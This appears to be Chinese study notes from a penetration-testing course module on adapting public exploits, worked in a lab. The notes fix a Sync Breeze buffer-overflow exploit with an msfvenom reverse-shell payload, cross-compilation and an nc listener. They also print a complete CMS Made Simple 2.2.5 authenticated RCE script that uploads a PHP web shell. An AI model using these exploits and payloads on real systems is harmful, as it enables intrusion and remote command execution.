# 13-Fixing Exploits

从头编写一个漏洞可能是困难和费时的。但在参与过程中，要找到一个符合我们确切需求的公开利用，同样是困难和费时的。一个不错的方案是修改公共利用，以适应我们的具体需要。

然而，这种解决方案也存在一些挑战。在缓冲区溢出等内存损坏利用的情况下，我们可能需要修改基本的目标参数，如套接字信息、返回地址、有效负载和偏移量。

理解每一个元素都是非常重要的。例如,如果我们的目标是运行Windows 2008服务器,我们试图运行一个利用对编写和测试的Windows 2003服务器,更新的保护机制,如本主题将最有可能导致应用程序崩溃,这可能锁定攻击向量在一段时间内或影响生产环境,这两种情况下我们应该避免的。

## 调整内存损坏利用

### 概述和注意事项

标准堆栈溢出的一般流程(在没有DEP和ASLR等缓解措施的用户模式下运行的应用程序中)相当直接。利用将:

\1. 创建一个大缓冲区以触发溢出。

\2. 通过使用适当的偏移量填充大缓冲区来覆盖堆栈上的返回地址，从而控制EIP。

3.在由可选NOP雪橇前置的缓冲区中包括选择的有效负载。

\4. 选择正确的返回地址指令，例如JMP ESP(或不同的寄存器)，以便将执行流重定向到我们的有效负载中。

此外，在我们修复漏洞时，根据漏洞的性质，我们可能需要修改已部署的缓冲区的元素以适应我们的目标，如文件路径、IP地址和端口、url等。如果这些修改改变了偏移量，我们必须调整缓冲区长度，以确保用所需的字节覆盖返回地址。

尽管我们可以相信在攻击中使用的返回地址是正确的，但更可靠的替代方法是自己找到返回地址，特别是如果使用的返回地址不属于易受攻击的应用程序或其dll的一部分。最可靠的方法之一是在虚拟机中本地克隆目标环境，然后在易受攻击的软件上使用调试器来获得返回地址指令的内存地址。

我们还必须考虑更改包含在原始利用代码中的有效负载。

正如在前面的模块中提到的，公共利用带来了内在的危险，因为它们通常包含十六进制编码的有效载荷，必须通过反向工程来确定它们如何工作。由于这一点，我们必须始终审查在公共利用中使用的有效载荷，或者更好的是，插入我们自己的有效载荷。

当我们这样做时，我们显然将包括我们自己的IP地址和端口号，并可能排除某些坏字符，我们可以自己确定或从利用注释收集。

尽管建议尽可能生成我们自己的有效负载，但也存在使用自定义有效负载的漏洞，这是成功破解脆弱应用程序的关键。如果是这种情况，我们唯一的选择是对有效负载进行反向工程，以确定它是如何工作的，以及它是否可以安全执行。这很困难，而且超出了本模块的范围，因此我们将转而关注shell代码替换。

在重新利用漏洞时，必须记住所有这些考虑事项。

### 导入和检查利用

这里还是以Sync Breeze的缓冲溢出来举例，我们先用searchsploit搜索一下。

```
searchsploit "Sync Breeze Enterprise 10.0.28"
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606181913950-5d2ee11f-5d76-4411-b092-45b7d9b78ff1.png)

由于我们已经熟悉了这个漏洞是如何工作的以及如何利用它的，因此我们有很好的机会来了解脚本语言(如Python)和编译语言(如C)之间的差异，而无需增加解决新漏洞的复杂性。

虽然这两种语言之间有很多不同之处，但我们将重点讨论影响我们的两个主要差异，包括内存管理和字符串操作。

第一个关键的区别是，脚本语言是通过解释器执行的，而不是通过编译来创建独立的可执行文件。因为脚本语言需要一个解释器，这意味着我们不能在没有安装Python的环境中运行Python脚本。这可能会在这个领域限制我们，特别是当我们需要一个必须在没有预装Python的环境中运行的独立漏洞(比如本地特权升级)时。

这两种语言之间的另一个区别是，在像Python这样的脚本语言中，连接一个字符串非常简单，通常采用两个字符串之间添加的形式:

正如本模块后面讨论的那样，在C等编程语言中不允许以这种方式连接字符串。

开始过程修改我们的漏洞，我们将移动目标漏洞利用到我们的当前工作目录。使用SearchSploit的-m镜像(复制)选项:

```
searchsploit -m 42341
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606182145222-6abf642c-6246-4b6b-beba-fce526b447e5.png)

通过简单地预览想这个C文件，会发现某些头文件，例如winsock2.h，应该是会调用windowsAPI的，所以一般需要在windows下进行编译。当然我们也可以在kali上面用交叉编译的方式进行编译。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606182329633-d9a956fa-4788-4497-b2a0-cf3407284321.png)

### 交叉编译利用代码

为了避免编译问题，一般建议对代码所针对的特定操作系统使用本地编译器;然而，这并不总是一种选择。

有些情况下，我们只能访问单个攻击环境(如Kali)，但需要利用针对不同平台编写的漏洞。这就是交叉编译器非常有用的地方。

在本节中，我们将使用非常流行的mingw-64交叉编译器。如果还没有，我们可以用apt安装:

```
sudo apt install mingw-w64
```

安装完时候，可以尝试用下面的指令，编译生成一个PE文件。

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606182706668-82349ed3-840d-474f-8a9f-c1e55375c192.png)

在编译过程中出现了一些错误，尽管错误似乎是外来的，但是简单地搜索“WSAStartup”就会发现这是在winsock.h中找到的一个函数。进一步的研究表明，当链接器找不到winsock库时，会出现这些错误，在i668 -w64-mingw32-gcc命令中添加-lws2_32参数应该可以解决这个问题:

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

### 改变套接字信息

我们已经知道这个攻击的目标是一个远程可访问的漏洞，这意味着我们的代码需要在某个点上建立到目标的连接。

检查C代码，我们注意到它使用硬编码的IP地址和端口，根据自己的情况进行修改:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606182993985-8c151c27-8a1e-4b0e-bf9b-4cb11cc2fe3a.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606183091839-93b56726-7516-49f3-b1ca-31c833edbad3.png)

### 修改Return地址

对代码的进一步检查发现使用了一个位于msvbvm60.dll的返回地址，这不是脆弱软件的一部分。在我们的Windows客户机上查看调试器中加载的模块，我们注意到这个DLL不在，这意味着返回地址对我们的目标无效。

如果我们已经从上一个模块获得了有效的利用，我们可以用我们自己的返回地址替换目标返回地址，这是有效的。

```
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```

如果我们没有以前开发的漏洞的返回地址，我们有一些选择。第一个也是最推荐的选项是在本地重新创建目标环境，并使用调试器确定此地址。这是我们开发原始利用的过程。

如果不能这样做，那么我们可以使用来自其他公开可用的漏洞的信息来获得一个可靠的返回地址，该地址将匹配我们的目标环境。例如，如果我们需要Windows Server 2003 SP2上的JMP ESP指令的返回地址，我们可以在利用针对该操作系统的不同漏洞的公共利用中寻找它。这种方法不太可靠，并且根据操作系统所安装的保护措施而变化很大。

作为一种替代方法，我们可以直接从目标机器获得一个返回地址。如果我们获得我们的目标和非特权用户想要运行一个利用,提升我们的特权,我们可以将我们感兴趣的dll复制到我们的进攻机器和使用各种工具,如反汇编器甚至msfpescan Metasploit框架来获得一个可靠的返回地址。

### 改变Payload

继续分析我们的C利用，我们注意到shellcode变量似乎保存了有效负载。因为它是以十六进制字节存储的，所以我们不能轻易确定它的用途。作者给出的唯一提示是引用了一个NOP滑梯，它是shellcode变量的一部分:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606183556291-9eec49fa-6976-4a57-9262-5b16be8a330e.png)

由于我们已经确定了坏字符从我们的研究在以前的利用，我们可以用msfvenom产生我们自己的payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.4 LPORT=443 EXITFUNC=thread -f c x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606183781477-a01e99f5-dcaa-4a01-879e-a2f8f95f1053.png)

然后把源码中的shellcoode替换成这一串就可以了，那一串NOP SLIDE不要删掉，记得把request的请求中的Host和Referer的IP也改一下：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606184236505-9470625e-8722-4817-b2b4-b3ece4d3839b.png)

然后就是将修改完毕的的源码重新编译一下：

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

现在我们有了一个更新的、清除编译漏洞，我们可以对其进行测试。我们将把调试器附加到沙箱测试目标上的SyncBreeze服务上，并在JMP ESP指令的内存地址上设置一个断点:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606184524507-36326fea-7fcf-4e68-8c7c-7d5356284f45.png)

一旦在调试器中设置了断点，我们就可以让应用程序正常运行，并尝试从Kali Linux执行我们的利用。

因为这个二进制文件是交叉编译在Windows上运行的，所以我们不能简单地在Kali Linux机器上运行它。为了运行这个Windows二进制文件，我们将使用wine，这是一个兼容层，能够运行Windows应用程序在几个操作系统，如Linux, BSD和MacOS:

```
wine syncbreeze_exploit.exe
```

执行这个指令最先开始可能会出错误，提示没有安装wine32，然后用 `sudo apt-get install wine32` 安装一下，但是安装过程中会出现依赖问题，用 `sudo apt-get --fix-broken install` 修复一下，一次可能不行，多执行几次，然后就一步步根据提示来就行，最后重新安装一下wine32，就不会报错了。安装完之后在用wine运行这个软件。

第一次运行，我们会发现产生崩溃了，但是崩溃地址是不对，你会发现差了一个字节的地址。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606189691645-e0f9b02c-5aa8-4735-85bd-33db3bf97c69.png)

### 改变溢出缓冲区

上面产的原因是因为C语言的函数的具体实现的问题，strcat将最后一个字节设为0x00，然后导致错位一个字节，具体的细节这里不赘述了，原文中是有概述讲解的，我这里只是说一下最后的解决方案。

把初始的缓冲区大小从780变为781就可以了

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606191251923-aa4c76a8-e116-4629-a3f6-5d3074fc4fb7.png)

然后重新编译生成PE文件，运行nc监听443端口，之后就是运行exploit灯带shell反弹。

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
sudo nc -lnvp 443
wine syncbreeze_exploit.exe
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606191709576-e228ab8c-7a7a-42a0-ac9b-fcc2e0a9c31d.png)

## 调整Web利用

> 这里都是原文的翻译内容，一切都是架空假设的，没有做相应的实验，请根据内容自行消化。

### 注意事项和概述

即使我们可能不必在web漏洞利用中处理hex编码的有效负载，但我们必须正确阅读代码，以了解在编辑过程中必须考虑哪些因素。

在修改web漏洞攻击时，在接近代码时，我们通常需要问几个关键问题：

•是否启动HTTP或HTTPS连接？

•它是否访问特定于web应用程序的路径或路由？

•该漏洞利用了预身份验证漏洞吗？

•如果没有，漏洞如何通过web应用程序验证？

•GET或POST请求是如何精心设计来触发和利用该漏洞的？

•它是否依赖于安装后可能更改的默认应用程序设置（如应用程序的web路径）？

•诸如自签名证书之类的异常情况是否会破坏攻击？

此外，我们必须记住，公共web应用程序漏洞利用不考虑额外的保护，如.htaccess。这主要是因为在开发过程中，攻击者不可能知道这些保护，而且它们不在漏洞的范围之内。

### 选择漏洞

让我们考虑以下场景。在一次评估中，我们发现一个Linux主机暴露了一个apache2服务器。在列举了web服务器之后，我们发现了一个CMS Made Simple version 2.2.5监听TCP端口443。此版本似乎易受远程代码执行的攻击，在exploit-DB上存在公共漏洞攻击。

此漏洞是身份验证后的漏洞，但是，在枚举过程中，我们在另一台计算机上发现了有效的应用程序凭据（admin/HUYfaw763）。

### 更改连接信息

在检查代码时，我们意识到需要更改base_url变量以匹配我们的环境：

```
base_url = "http://192.168.1.10/cmsms/admin"
```

我们必须将IP地址和协议修改为HTTPS：

```
base_url = "https://10.11.0.128/admin"
```

我们还注意到，当我们浏览目标网站时，会出现SEC_UNKNOWN_ISSUER 错误。此错误表示无法验证远程主机上的证书。我们需要在漏洞代码中说明这一点。

具体来说，该漏洞利用请求Python库与目标进行通信。代码在第34、55和80行发出三个post请求：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606208375941-bf84af0a-a575-4192-ab54-2e38f3f7d16e.png)

官方文档指出，如果我们将verify参数设置为False，则将忽略SSL证书：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606208401041-4122f95a-dcb0-4c53-af04-dbff16cfa1ab.png)

最后，我们还需要更改原始攻击中使用的凭据，以匹配枚举过程中找到的凭据。它们分别在第15行和第16行的username和password变量中定义：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606208424634-844d1b8f-4faf-478b-994d-44ccb451a110.png)

我们可以轻松地替换这些凭据：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606208441500-4ab885c9-2aa8-4339-af16-7ad3b0550042.png)

注意，在这种情况下，我们不需要更新简单的有效负载，因为它只执行在GET请求中以明文形式传递的系统命令。

完成所有编辑后，最终的攻击应该如下所示：

```
# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution 
# Date: 3rd of July, 2018 
# Exploit Author: Mustafa Hasan (@strukt93) 
# Vendor Homepage: http://www.cmsmadesimple.org/ 
# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/ 
# Version: 2.2.5 
# CVE: CVE-2018-1000094

import requests 
import base64

base_url = "https://10.11.0.128/admin" 
upload_dir = "/uploads" 
upload_url = base_url.split('/admin')[0] + upload_dir 
username = "admin" 
password = "HUYfaw763"

csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit" 
    } 
    response = requests.post(url, data=data, allow_redirects=False, verify=False) 
    status_code = response.status_code 
    if status_code == 302:
        print "[+] Authenticated successfully with the supplied credentials"
        return response.cookies, parse_csrf_token(response.headers['Location']) 
    print "[-] Authentication failed" 
    return None, None
def upload_txt(cookies, csrf_token):
    mact = "FileManager,m1_,upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "disable_buffer": 1
    }
    txt = {
        'm1_files[]': (txt_filename, payload)
    }
    print "[*] Attempting to upload {}...".format(txt_filename)
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    status_code = response.status_code
    if status_code == 200:
        print "[+] Successfully uploaded {}".format(txt_filename)
        return True
    print "[-] An error occurred while uploading {}".format(txt_filename)
    return None

def copy_to_php(cookies, csrf_token):
    mact = "FileManager,m1_,fileaction,0"
    page = "/moduleinterface.php"
    url = base_url + page
    b64 = base64.b64encode(txt_filename)
    serialized = 'a:1:{{i:0;s:{}:"{}";}}'.format(len(b64), b64)
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "m1_fileactioncopy": "",
        "m1_path": upload_dir,
        "m1_selall": serialized,
        "m1_destdir": "/",
        "m1_destname": php_filename,
        "m1_submit": "Copy"
    }
    print "[*] Attempting to copy {} to {}...".format(txt_filename, php_filename)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        if response.headers['Location'].endswith('copysuccess'):
            print "[+] File copied successfully"
            return True
    print "[-] An error occurred while copying, maybe {} already exists".format(php_filename)
    return None    

def quit():
    print "[-] Exploit failed"
    exit()

def run():
    cookies,csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print "[+] Exploit succeeded, shell can be found at: {}".format(upload_url + '/' + php_filename)

run()
```

运行利用漏洞会生成意外错误：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606208907024-a7ddf6f6-50a9-4911-bba2-90a837ba9cf0.png)

显示在代码的第24行执行parse_csrf_token函数期间触发了一个异常。这个错误告诉我们代码试图通过访问Python列表的第二个元素来访问它不存在的元素(location.split(csrf_param + “=”)[1])。

### 排除“索引超出范围”错误

检查我们的漏洞攻击的第24行，我们注意到它使用split方法来分割存储在传递给parse_csrf_token函数的location参数中的字符串。split的Python文档指出，该方法使用作为第一个参数传递的可选分隔符对输入字符串进行切片。然后，split返回的字符串片段存储在Python列表对象中，该对象可以通过索引进行访问：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209051201-eed7175b-ae61-487c-b918-d885681bb4aa.png)

在我们的攻击代码中，字符串分隔符定义为csrf_param变量（“__c”），后跟等号：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209087644-00fd6090-b1d8-492a-9fbf-4a57268fc248.png)

为了更好地理解索引器错误，我们可以在parse_csrf_token函数中的return指令之前添加print语句：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209107475-8ace9cf6-eb42-4c77-b469-3ed39fb0c98b.png)

现在，在调用split方法之前，该漏洞利用会显示完整的字符串：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209137264-94ad93ae-b9f0-4f34-8616-ee7fa7ea44fd.png)

虽然利用漏洞代码预期输入字符串包含__c（在csrf_param变量中定义），如图所示，但我们从web应用程序收到了_sk_。

在这一点上，我们不完全理解为什么会发生这种情况。可能是开发人员的软件和我们的软件版本不匹配，或者是CMS配置不匹配。不管怎样，开发从来都不是简单的。

不过，我们可以尝试将csrf_param变量从__c更改为_sk_，以匹配CMS响应并查看漏洞是否有效：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209197252-4b745a0f-7561-415c-abf5-80b409c1f9c2.png)

现在让我们执行修改后的漏洞利用：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209216231-6fb2e9e6-614b-47ad-8464-e5b8b3b16608.png)

错误不再显示，我们将看到一条消息，通知我们已成功利用漏洞。虽然我们不清楚为什么我们需要改变csrf参数从__c到_sk_。但这是一个很好的机会来适应意想不到的情况，这是一个伟大的渗透测试人员做得很好的事情。

现在，我们可以通过使用curl等工具附加到php shell并提供一个系统命令作为有效负载来验证该漏洞：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606209289717-64c6be4f-55bf-4167-a334-f103b497bb83.png)